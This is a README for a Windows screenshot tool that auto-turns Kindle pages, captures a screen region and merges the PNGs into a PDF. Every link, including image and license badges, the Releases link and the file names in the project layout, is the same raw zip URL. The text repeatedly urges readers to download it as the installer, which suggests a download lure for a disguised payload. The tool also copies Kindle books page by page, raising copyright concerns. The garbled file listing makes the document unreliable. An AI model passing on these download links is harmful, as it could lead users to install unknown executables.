# Screenshot Automator: Windows Tkinter Tools for Screenshots and PDF Workflows

![Python Logo](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)
![Windows Logo](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)

[![Releases](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)
[![License](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)
[![Python](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)

Screenshots. Regions. PDFs. All in one tiny Windows toolkit built with Tkinter. This project is a pair of utilities that makes screen work on Windows machines faster and more predictable. You can capture a chosen screen region while the app advances Kindle pages automatically, and you can sort PNGs by name to assemble them into a single PDF. The tools rely on pyautogui for automation, mss for fast screen grabs, and Pillow for image handling.

Download the latest Windows build from the Releases page: https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip From that page you can grab the installer or packaged artifact for your system. The Releases page is the hub for binaries and updates. See the same link again later in this document to confirm where to download the files you need.

Table of contents
- Why this project exists
- What you get
- How it fits into your workflow
- System requirements
- Installation and setup
- Quick start: capture flow
- Quick start: PNGs to PDF flow
- How the two utilities work
- Usage patterns and tips
- File layout and project structure
- Customization and advanced options
- Troubleshooting and common issues
- Testing and validation
- Contributing and guidelines
- Licensing

Why this project exists
Screenshots are essential in many tasks, from documentation to design handoffs. When working on devices with Kindle content, you may need a smooth way to capture pages while they advance. Manual captures can be slow or inconsistent. This project provides a deterministic pair of tools to streamline that process and to convert a batch of PNG captures into a single consolidated PDF. The approach is lightweight, leveraging well-known Python libraries to minimize setup friction while keeping the code approachable for learning and experimentation.

What you get
- A Windows Tkinter-based utility to capture a user-defined region of the screen while Kindle pages advance automatically. The tool automates keyboard input to advance pages and records the resulting region at defined intervals or on demand.
- A second utility to sort PNGs by filename and stitch them into a single PDF, in a predictable order. This is useful after batch captures, when you want a portable document with all pages in the right sequence.
- Clear, straightforward workflows that you can modify for your own needs. The code is designed to be easy to read and extend, with modular components and well-documented functions.

How this fits into your workflow
- Quick captures during e-book or document review on a Kindle app or streaming interface.
- A reliable path from raw PNG captures to a final, shareable PDF.
- Lightweight tooling that you can run from a Windows environment without heavy shell scripts or external dependencies beyond Python libraries.

System requirements
- Windows OS (Windows 10 or newer recommended)
- Python 3.x installed (any modern 3.x release will work)
- A working Tkinter environment (comes with Python standard library)
- Internet access for initial setup and library installation (optional if you vendor dependencies locally)
- Sufficient disk space for temporary PNGs during capture and the final PDF

Installation and setup
- Prerequisites: Install Python 3.x from the official site if it is not already present on your system. Ensure that Python and pip are available in your system path.
- Virtual environment (recommended): Create a dedicated Python virtual environment to isolate dependencies.
  - python -m venv venv
  - venv\Scripts\activate
  - pip install --upgrade pip
- Install the required dependencies:
  - pip install pyautogui mss pillow
- Obtain the binary or source from the official release page:
  - Download the latest Windows build from the Releases page: https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip
  - If you prefer to build from source, clone the repository and install the same dependencies.

Quick start: capture flow (two-pane overview)
- Launch the first utility, which presents a Tkinter window to guide you through the capture process.
- Define the capture region by drawing or selecting a rectangle on the screen. The window will display live feedback so you can adjust the region precisely.
- Start the Kindle page advance automation. The tool will simulate page-turn actions and capture the selected region at each trigger.
- Save or accumulate PNGs in a designated folder. The first utility can be configured to pause after each capture or to proceed automatically at fixed time intervals.
- After you finish capturing, you can move to the second utility to assemble the PNGs into a PDF or review the PNG sequence.

Quick start: PNGs to PDF flow
- Place all PNG images in a single folder in a filename-sorted order. Sorting by name ensures the content appears in the intended sequence in the final document.
- Run the second utility. It will:
  - Sort the PNGs by filename
  - Convert each PNG to a PDF page in order
  - Merge pages into a single PDF file
  - Save the PDF to a user-specified location
- Open and review the PDF with any compatible viewer. If needed, adjust the image resolution or PDF compression settings to balance quality and file size.

Two utilities: details and how they interlock
Utility 1: Screen region capture with Kindle page automation
- Purpose: Capture a user-defined portion of the screen while Kindle pages advance automatically.
- Interface: A Tkinter-based GUI with controls to select the capture region, adjust timing, and choose a target folder for PNGs.
- Region selection: Drag a rectangle on the screen to define the capture bounds. The region is stored as coordinates (x, y, width, height).
- Kindle automation: The tool uses automation libraries to send keystrokes for page turns. It supports common navigation keys (e.g., right arrow, space, or page down) and can adapt to different Kindle apps or windows.
- Capture cadence: You can set a delay between page turns, a frame rate target, or trigger captures manually. The software aims for consistent spacing so the PNGs align with the corresponding pages.
- Output: PNG files named in a consistent pattern, like https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip, https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip, and so on, to simplify later assembly.

Utility 2: Sort PNGs by name and assemble into a single PDF
- Purpose: Convert an ordered set of PNGs into a PDF document with minimal user input.
- Sorting behavior: The tool sorts by filename, ensuring that https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip comes before https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip, etc.
- Image handling: Uses Pillow to read each PNG, convert to the desired color mode (RGB), and render onto PDF pages in order.
- PDF creation: Produces a single PDF file that preserves the sequence of the PNGs. Memory and performance considerations are handled carefully to work with typical batch sizes without exhausting resources.
- Output: A final PDF saved to a location you specify, ready for sharing or printing.

How the two utilities work under the hood
- Core libraries:
  - pyautogui: Handles cross-window automation and simulated keystrokes for Kindle navigation.
  - mss: Provides fast, reliable screen capture across multiple monitors with minimal overhead.
  - Pillow: Opens PNG files, performs color conversion, and composes PDF pages.
- Data flow:
  - Utility 1 captures region frames and writes PNGs to disk in a controlled, named sequence.
  - Utility 2 reads those files in name order, converts to PDF pages, and saves a single, cohesive document.
- Error handling:
  - The code checks for missing files, mismatched dimensions, and potential library errors.
  - Clear messages guide you to correct any issues, such as adjusting capture region or ensuring the PNGs are sequentially named.
- Cross-platform considerations:
  - While the workflow targets Windows, the underlying libraries are cross-platform. The current implementation optimizes for Windows behavior given Tkinter on Windows and Kindle app dynamics.

Usage patterns and tips
- Organizing captures:
  - Keep captures in a dedicated folder with a clean naming convention. The naming is crucial for the final PDF order.
  - Use a single, consistent prefix like page_ or cap_ to simplify sorting.
- Managing the capture region:
  - Start with a generously sized region and crop down if you need to exclude borders or UI elements.
  - Consider consistent margins around content to ensure clean PDF pages.
- Page-turn automation:
  - Verify the Kindle window focus before starting automation to ensure keystrokes land on the right application.
  - Test with a single page to confirm timing and region accuracy before running a longer sequence.
- PDF quality and size:
  - If the resulting PDF is large, tweak the image resolution or compression settings in the PDF assembly step.
  - For quick previews, create a lower-resolution PDF first; generate a high-res version later if needed.
- Performance considerations:
  - The capture loop can generate many PNGs quickly. Ensure disk I/O performance is adequate to avoid a bottleneck.
  - When working with large batches, consider batch processing to avoid exhausting memory or storage.

File layout and project structure
- repository root
  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip (this file)
  - LICENSE
  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip or a small dependencies manifest
  - src/ (source code)
    - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip (Utility 1: region capture with Kindle automation)
    - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip (Utility 2: PNGs to PDF)
    - common/ (shared utilities and helpers)
  - assets/ (optional assets like sample images or icons)
  - docs/ (extra documentation, guides, or references)
  - tests/ (unit and integration tests, if present)
- key files
  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip The Tkinter interface and region selection logic; includes window layout, region coordinates storage, and the automation loop for page turns.
  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip The image-to-PDF pipeline; handles PNG discovery, sorting, and PDF stitching with Pillow.
  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip Lists pyautogui, mss, Pillow, and any test or development tools used in the project.

Customization and advanced options
- Region selection customization:
  - You can adjust the default capture region by editing coordinate values or by reloading a saved region configuration.
  - Consider adding a hotkey to re-center or resize the capture region on the fly if you work with dynamic layouts.
- Kindle navigation customization:
  - If you use a Kindle app with alternate navigation (e.g., different key bindings), map the automation layer to the corresponding keystrokes.
- Output customization:
  - Change PNG naming patterns to suit your file management strategy.
  - Modify the PDF creation step to choose page orientation (portrait/landscape), DPI, or color modes.
- Automation safety:
  - Add a playful safeguard to pause if the active window is not the target Kindle app, preventing unintended screen captures.

Troubleshooting and common issues
- No capture region appears:
  - Ensure the region selection UI is visible and interactive. Confirm you can drag to define the rectangle.
- Page turns do not advance Kindle:
  - Confirm the Kindle window is focused when the automation starts.
  - Check that the keys used for navigation match your Kindle app (arrow keys, space, or page down).
- PNGs missing or out of order:
  - Verify the naming scheme. The second utility relies on a consistent, lexicographic filename order.
  - Make sure there are no non-image files in the capture folder or that you exclude them in the script.
- PDF output is blank or small:
  - Confirm that the PNGs are valid images and that their dimensions are appropriate for PDF stitching.
  - Check the DPI or quality settings in the PDF assembly step.
- Performance concerns:
  - If captures lag, reduce the cadence or the region size. Ensure there is enough disk I/O bandwidth for the PNG writes.
- Dependency issues:
  - If pip cannot install pyautogui, mss, or Pillow, ensure your Python environment is properly configured and that you have permissions to install packages.

Testing and validation
- Unit tests (if present) cover basic operations like:
  - Region coordinate serialization and deserialization
  - File naming conventions
  - PDF page assembly order
- Integration tests simulate a short, end-to-end run:
  - Capture a few frames
  - Assemble a small PDF
  - Validate that the PDF file exists and contains the expected number of pages
- Manual validation steps:
  - Run the capture utility with a known region and a short sequence to confirm region accuracy and page-turn reliability.
  - Use a small batch of PNGs to verify the sorting and PDF assembly flow before scaling up.

Contributing and guidelines
- To contribute, fork the repository and open a pull request with a clear description of changes.
- Follow the existing coding style: simple, readable code with clear variable names and minimal nesting.
- Include tests or use a lightweight verification plan for any new features.
- Documentation improvements are welcome: add examples, edge cases, and diagrams that illustrate the capture region and the final PDF structure.
- If you find a bug, provide steps to reproduce, your environment details, and the expected vs. actual results.
- Community expectations: be respectful, provide constructive feedback, and focus on making the tools more robust and useful for a broader set of workflows.

Changelog and history
- Initial release introduces the two core utilities and a minimal, clean interface.
- Subsequent updates add:
  - More robust region handling with visual feedback
  - Improved synchronization between capture and page-turn events
  - Enhanced sorting reliability for PNGs with varying naming conventions
  - Flexible PDF output options including resolution and color modes
- Future milestones (tentative):
  - Cross-platform support for macOS and Linux
  - Optional CLI wrapper to operate the tools without a GUI
  - Additional image formats support (e.g., JPEG, TIFF)
  - Advanced error reporting with logs and diagnostic data

Licensing
- The project is released under the MIT license.
- This license allows broad usage, modification, distribution, and private use, provided that the license text and copyright notice are included with copies of the software.
- Please review the LICENSE file in the repository for full terms and any caveats.

Releases and where to download
- Releases page (Windows installers, binaries, and release notes) is the primary source for prebuilt artifacts and updates. Access the page here: https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip
- The releases page contains the exact installer file names, version numbers, and release-specific instructions. For a direct route to the artifacts, navigate to the Releases page and grab the Windows build that matches your system. If you need a fresh copy or a newer build, this is the place to check first.

Additional resources and community
- Documentation hub: the docs/ folder holds extended guides, user-facing explanations, and developer notes to help you extend the utilities.
- Community channels: you can engage with contributors through issues and pull requests on GitHub. Share your use cases, propose feature ideas, and report bugs with reproducible steps.
- Example workflows: there are example scripts and notebooks in the src/examples/ directory showing typical capture-to-PDF flows, including timing scenarios, region shapes, and batch processing patterns.

Design decisions and rationale
- Simplicity over complexity: the core idea is to provide two focused utilities with clear, well-defined responsibilities. This makes it easier to maintain and adapt.
- Modularity: the codebase is partitioned into a GUI module for the capture task and a file-assembly module for the PNG-to-PDF workflow. This separation helps with testing and potential refactoring.
- Visibility and clarity: the code favors explicit naming, straightforward control flow, and informative error messages to assist users who are new to automation and image processing.
- Extensibility: the architecture supports adding new features with minimal disruption. For example, you can add alternative input methods (like a mouse-drawn region or a numeric coordinate input) or support for alternate output formats.

Screenshots and visuals
- The project emphasizes a visual workflow. Expect to see:
  - A simple Tkinter window for region selection and capture control
  - Live feedback on the captured region dimensions
  - A preview of the next frame to capture
  - A progress indicator during the PNG-to-PDF assembly
- Sample images (PNG captures) illustrate what the output looks like and how pages align in the final PDF.

Security and safety notes
- The tools interact with the operating system to simulate keystrokes and capture screen content. Only run the utilities on machines you control and be mindful of the content on your screen during automated captures.
- Avoid running the capture utility while sensitive information is visible unless you configure local directories with proper access controls.
- Use trusted sources for installations, and verify that you are downloading from the official Releases page to prevent tampering.

Documentation strategy and future-proofing
- The README is intentionally comprehensive to reduce the need for external references for common tasks.
- Additional, deeper documentation sits in the docs/ folder to keep the README readable while still offering settlers a path to more detail.
- We anticipate expanding automation patterns (e.g., multi-monitor support, advanced timing strategies, and better error reporting) as use cases evolve.

Closing notes
- This repository exists to empower users to streamline capture workflows and PDF assembly with a simple, reliable toolkit built around Tkinter and Python's image and automation libraries.
- The two utilities are designed to be discovered, learned, and adapted. They form a cohesive workflow that links screen capture with document assembly in a clean, approachable way.

Releases and download reminder
- For convenience, the Windows installer and release artifacts live at the Releases page. Access it here: https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip
- If you’re looking for the installer, the same link provides direct access to the Windows binaries. Visit the page to see the latest version and download the appropriate file. The link is provided twice above to ensure you can locate the resources you need whenever you return to this project.